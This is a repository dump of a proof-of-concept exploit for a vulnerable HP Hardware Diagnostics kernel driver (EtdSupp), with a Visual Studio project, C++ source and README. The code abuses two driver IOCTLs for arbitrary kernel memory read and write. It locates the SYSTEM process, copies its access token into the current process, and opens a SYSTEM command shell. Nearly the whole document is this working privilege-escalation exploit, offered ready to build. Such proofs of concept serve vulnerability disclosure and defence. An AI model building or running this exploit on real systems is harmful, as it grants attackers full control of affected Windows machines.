Project Path: arc_gmh5225_HPHardwareDiagnostics-PoC_0htcasec

Source Tree:

```txt
arc_gmh5225_HPHardwareDiagnostics-PoC_0htcasec
├── HPHardwareDiagnosticsPoC
│   ├── HPHardwareDiagnosticsPoC.vcxproj
│   ├── HPHardwareDiagnosticsPoC.vcxproj.filters
│   ├── HpSupportMemoryMgr.cpp
│   ├── HpSupportMemoryMgr.h
│   └── Source.cpp
├── HPHardwareDiagnosticsPoC.sln
├── LICENSE
├── README.md
└── etdsupp.sys

```

`HPHardwareDiagnosticsPoC.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 16
VisualStudioVersion = 16.0.30804.86
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "HPHardwareDiagnosticsPoC", "HPHardwareDiagnosticsPoC\HPHardwareDiagnosticsPoC.vcxproj", "{64D6C815-C3C6-4CA7-ADA6-8E6690FF229F}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{64D6C815-C3C6-4CA7-ADA6-8E6690FF229F}.Debug|x64.ActiveCfg = Debug|x64
		{64D6C815-C3C6-4CA7-ADA6-8E6690FF229F}.Debug|x64.Build.0 = Debug|x64
		{64D6C815-C3C6-4CA7-ADA6-8E6690FF229F}.Debug|x86.ActiveCfg = Debug|Win32
		{64D6C815-C3C6-4CA7-ADA6-8E6690FF229F}.Debug|x86.Build.0 = Debug|Win32
		{64D6C815-C3C6-4CA7-ADA6-8E6690FF229F}.Release|x64.ActiveCfg = Release|x64
		{64D6C815-C3C6-4CA7-ADA6-8E6690FF229F}.Release|x64.Build.0 = Release|x64
		{64D6C815-C3C6-4CA7-ADA6-8E6690FF229F}.Release|x86.ActiveCfg = Release|Win32
		{64D6C815-C3C6-4CA7-ADA6-8E6690FF229F}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {C152ED94-BFB6-457C-B6FD-4A103DA1F1B0}
	EndGlobalSection
EndGlobal

```

`HPHardwareDiagnosticsPoC/HPHardwareDiagnosticsPoC.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{64d6c815-c3c6-4ca7-ada6-8e6690ff229f}</ProjectGuid>
    <RootNamespace>HPHardwareDiagnosticsPoC</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="HpSupportMemoryMgr.cpp" />
    <ClCompile Include="Source.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="HpSupportMemoryMgr.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`HPHardwareDiagnosticsPoC/HPHardwareDiagnosticsPoC.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="Source.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="HpSupportMemoryMgr.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="HpSupportMemoryMgr.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`HPHardwareDiagnosticsPoC/HpSupportMemoryMgr.cpp`:

```cpp
#include "HpSupportMemoryMgr.h"

HpSupportMemoryMgr::HpSupportMemoryMgr() {}

BOOL HpSupportMemoryMgr::init()
{
	this->hDevice = CreateFileA(
		R"(\\.\EtdSupport_18.0)",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL, OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	return this->hDevice != NULL && this->hDevice != INVALID_HANDLE_VALUE;
}

BOOL HpSupportMemoryMgr::ReadVirtData(UINT64 address, SIZE_T szRead, PVOID data)
{
	BOOL bRes = FALSE;
	EDTI_DATA edr = { 0 };
	EDTI_READ edr_out = { 0 };
	DWORD dwBytesReturned = 0;
	SIZE_T szRem = szRead;

	if (!(data && szRead)) {
		return FALSE;
	}


	while (szRem != 0) {
		SIZE_T offset = szRead - szRem;
		edr.read.src = (address + offset);

		if (szRem >= 4) {
			edr.read.szRead = 4;
			szRem -= 4;
		}
		else if (szRem >= 2) {
			edr.read.szRead = 2;
			szRem -= 2;
		}
		else if (szRem == 1)
		{
			edr.read.szRead = 1;
			--szRem;
		}

		bRes = DeviceIoControl(
			this->hDevice,
			IOCTL_READ,
			&edr,
			sizeof(EDTI_READ),
			&edr,
			sizeof(EDTI_READ),
			&dwBytesReturned,
			NULL
		);

		if (!bRes) {
			GLE("DeviceIoControl Failed");
			DumpHex(&edr, sizeof(EDTI_DATA));
			return FALSE;
		}		

		switch (edr.read.szRead)
		{
		case 1:
			*(PBYTE)((UINT64)data + offset) = (BYTE)edr.read.data;
			break;
		case 2:
			*(PWORD)((UINT64)data + offset) = (WORD)edr.read.data;
			break;
		case 4:
			*(PDWORD)((UINT64)data + offset) = (DWORD)edr.read.data;
			break;
		default:
			break;
		}
	}

	return TRUE;
}

BOOL HpSupportMemoryMgr::WriteVirtData(UINT64 dest, SIZE_T szWrite, PVOID data)
{
	BOOL bRes = FALSE;
	EDTI_DATA edr = { 0 };
	EDTI_READ edr_out = { 0 };
	DWORD dwBytesReturned = 0;
	SIZE_T szRem = szWrite;

	if (!(data && szWrite)) {
		return FALSE;
	}

	while (szRem != 0) {
		SIZE_T offset = szWrite - szRem;
		edr.write.where = (dest + offset);

		if (szRem >= 4) {
			edr.write.szWrite = 4;
			edr.write.what = *(PDWORD)((UINT64)data + offset);
			szRem -= 4;
			
		}
		else if (szRem >= 2) {
			edr.write.szWrite = 2;
			edr.write.what = *(PWORD)((UINT64)data + offset);
			szRem -= 2;
		}
		else if (szRem == 1)
		{
			edr.write.szWrite = 1;
			edr.write.what = *(PBYTE)((UINT64)data + offset);
			--szRem;
		}

		bRes = DeviceIoControl(
			this->hDevice,
			IOCTL_WRITE,
			&edr,
			sizeof(EDTI_READ),
			NULL,
			0,
			&dwBytesReturned,
			NULL
		);

		if (!bRes) {
			GLE("DeviceIoControl Failed");
			return FALSE;
		}
	}

	return TRUE;
}


```

`HPHardwareDiagnosticsPoC/HpSupportMemoryMgr.h`:

```h
#pragma once
#include <Windows.h>
#include <stdio.h>

#define IOCTL_READ 0x8000603C
#define IOCTL_WRITE 0x8000A038


#define GLE( x ) { printf("%s failed - %d\n", x, GetLastError()); }

static void DumpHex(const void* data, size_t size) {
	char ascii[17];
	size_t i, j;
	ascii[16] = '\0';
	for (i = 0; i < size; ++i) {
		printf("%02X ", ((unsigned char*)data)[i]);
		if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
			ascii[i % 16] = ((unsigned char*)data)[i];
		}
		else {
			ascii[i % 16] = '.';
		}
		if ((i + 1) % 8 == 0 || i + 1 == size) {
			printf(" ");
			if ((i + 1) % 16 == 0) {
				printf("|  %s \n", ascii);
			}
			else if (i + 1 == size) {
				ascii[(i + 1) % 16] = '\0';
				if ((i + 1) % 16 <= 8) {
					printf(" ");
				}
				for (j = (i + 1) % 16; j < 16; ++j) {
					printf("   ");
				}
				printf("|  %s \n", ascii);
			}
		}
	}
}

typedef struct _EDTI_READ {
	UINT64 szRead; // 1, 2, 4
	UINT64 reserved0;
	UINT64 src;
	UINT32 data;
	UINT32 reserved1;
} EDTI_READ, * PEDTI_READ;

typedef struct _EDTI_WRITE {
	UINT64 szWrite; // 1, 2, 4
	UINT64 reserved0;
	UINT64 where;
	UINT64 what;
} EDTI_WRITE, * PEDTI_WRITE;

union EDTI_DATA {
	EDTI_READ read;
	EDTI_WRITE write;
};

class HpSupportMemoryMgr
{
public:
	HANDLE hDevice = INVALID_HANDLE_VALUE;

	BOOL ReadVirtData(UINT64 src, SIZE_T szRead, PVOID data);
	BOOL WriteVirtData(UINT64 dest, SIZE_T szWrite, PVOID data);
	
	HpSupportMemoryMgr();
	BOOL init();
};


```

`HPHardwareDiagnosticsPoC/Source.cpp`:

```cpp
#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#include <intrin.h>
#include "HpSupportMemoryMgr.h"	
#pragma comment(lib, "ntdll")

#define OFFSET_EPROCESS_LINKS 0x448
#define OFFSET_EPROCESS_TOKEN 0x4b8
#define OFFSET_EPROCESS_PID 0x440
#define SYS_INFO_CLASS_MODULE_INFO 0x0b

typedef struct SYSTEM_MODULE {
	PVOID  Reserved1;
	PVOID  Reserved2;
	PVOID  ImageBase;
	ULONG  ImageSize;
	ULONG  Flags;
	USHORT Index;
	USHORT NameLength;
	USHORT LoadCount;
	USHORT PathLength;
	CHAR   ImageName[256];
} SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

UINT64 FindNtosBase()
{
	UINT64 retval = 0;
	HANDLE hHeap = GetProcessHeap();
	LPVOID lpHeapBuffer = HeapAlloc(hHeap, 0, 0x2000);
	DWORD dwBytesReturned = 0;

	if (!lpHeapBuffer) {
		return NULL;
	}

	NTSTATUS status = NtQuerySystemInformation(
		(SYSTEM_INFORMATION_CLASS)SYS_INFO_CLASS_MODULE_INFO,
		lpHeapBuffer,
		0x2000,
		&dwBytesReturned
	);

	// realloc and try again
	// todo: add switch case for status
	if (!NT_SUCCESS(status)) {
		HeapFree(hHeap, 0, lpHeapBuffer);
		lpHeapBuffer = HeapAlloc(hHeap, 0, dwBytesReturned);

		if (!lpHeapBuffer) {
			return NULL;
		}

		status = NtQuerySystemInformation(
			(SYSTEM_INFORMATION_CLASS)SYS_INFO_CLASS_MODULE_INFO,
			lpHeapBuffer,
			dwBytesReturned,
			&dwBytesReturned
		);

		if (!NT_SUCCESS(status)) {
			return NULL;
		}
	}

	PSYSTEM_MODULE_INFORMATION psm = (PSYSTEM_MODULE_INFORMATION)lpHeapBuffer;
	if (psm->ModulesCount > 0) {
		retval = (UINT64)psm->Modules[0].ImageBase;
		HeapFree(hHeap, 0, lpHeapBuffer);
		return retval;
	}

	return NULL;
}


BOOL SearchEprocessLinksForPid(HpSupportMemoryMgr hm, UINT64 Pid, UINT64 SystemEprocess, PUINT64 lpTargetProcess) {
	BOOL bRes = FALSE;
	if (!lpTargetProcess) {
		return FALSE;
	}

	UINT64 ListIter = SystemEprocess + OFFSET_EPROCESS_LINKS;
	UINT64 ListHead = ListIter;
	while (TRUE) {
		puts("Reading list iter");
		printf("ListIter : %llx\n", ListIter);
		bRes = hm.ReadVirtData((ListIter + 0x8), sizeof(ListIter), &ListIter);
		printf("ListIter->Flink : %llx\n", ListIter);
		if (!bRes) {
			return FALSE;
		}

		if (ListIter == ListHead) {
			puts("Process not found in ActiveProcess links!");
			return FALSE;
		}

		UINT64 IterEprocessBase = ListIter - OFFSET_EPROCESS_LINKS;
		UINT64 IterPid = 0;

		bRes = hm.ReadVirtData((IterEprocessBase + OFFSET_EPROCESS_PID), sizeof(IterPid), &IterPid);
		if (!bRes) {
			return FALSE;
		}

		
		if (IterPid == Pid) {
			printf("Found target EPROCESS : %llx - PID %llx\n", IterEprocessBase, IterPid);
			*lpTargetProcess = IterEprocessBase;
			return TRUE;
		}
	}
}

UINT64 GetPsInitialSystemProc(UINT64 lpNtoskrnlBase) {
	HMODULE hNtos = LoadLibraryA("ntoskrnl.exe");
	if (!hNtos) {
		return NULL;
	}

	PVOID initial_proc = GetProcAddress(hNtos, "PsInitialSystemProcess");
	initial_proc = (PVOID)(((SIZE_T)initial_proc - (SIZE_T)hNtos) + (SIZE_T)lpNtoskrnlBase);
	FreeLibrary(hNtos);
	return (UINT64)initial_proc;
}

int main() {
	HpSupportMemoryMgr hpmm = HpSupportMemoryMgr();
	BOOL bInit = hpmm.init();
	if (!bInit) {
		printf("Failed to init - %lx\n", GetLastError());
		return -1;
	}
	UINT64 NtosBase = FindNtosBase();
	UINT64 OurProcess = 0;
	UINT64 PsInitialSystemProcPtr = GetPsInitialSystemProc(NtosBase);
	printf("Found initial system process at %llx\n", PsInitialSystemProcPtr);
	UINT64 SystemProc = 0;
	hpmm.ReadVirtData(PsInitialSystemProcPtr, sizeof(PsInitialSystemProcPtr), &SystemProc);
	SearchEprocessLinksForPid(hpmm, GetCurrentProcessId(), SystemProc, &OurProcess);
	UINT64 SystemToken = 0;

	puts("Copying system token to our process");

	hpmm.ReadVirtData(SystemProc + OFFSET_EPROCESS_TOKEN, sizeof(SystemToken), &SystemToken);
	hpmm.WriteVirtData(OurProcess + OFFSET_EPROCESS_TOKEN, sizeof(SystemToken), &SystemToken);

	// let's all love lain
	system("C:\\Windows\\System32\\cmd.exe");

}
```

`LICENSE`:

```
This is free and unencumbered software released into the public domain.

Anyone is free to copy, modify, publish, use, compile, sell, or
distribute this software, either in source code form or as a compiled
binary, for any purpose, commercial or non-commercial, and by any
means.

In jurisdictions that recognize copyright laws, the author or authors
of this software dedicate any and all copyright interest in the
software to the public domain. We make this dedication for the benefit
of the public at large and to the detriment of our heirs and
successors. We intend this dedication to be an overt act of
relinquishment in perpetuity of all present and future rights to this
software under copyright law.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR
OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE,
ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
OTHER DEALINGS IN THE SOFTWARE.

For more information, please refer to <https://unlicense.org>
```

`README.md`:

```md
# HPHardwareDiagnostics-PoC
PoC exploit for HP Hardware Diagnostic's EtdSupp driver

### Building
* Open in Visual Studio 2019
* Build in release
* Admire (or don't)

### Summary
Pretty simple little driver with virtual memory r/w, no MmMapIoSpace, etc.

### Disclaimer
Diet soda is disgusting 

```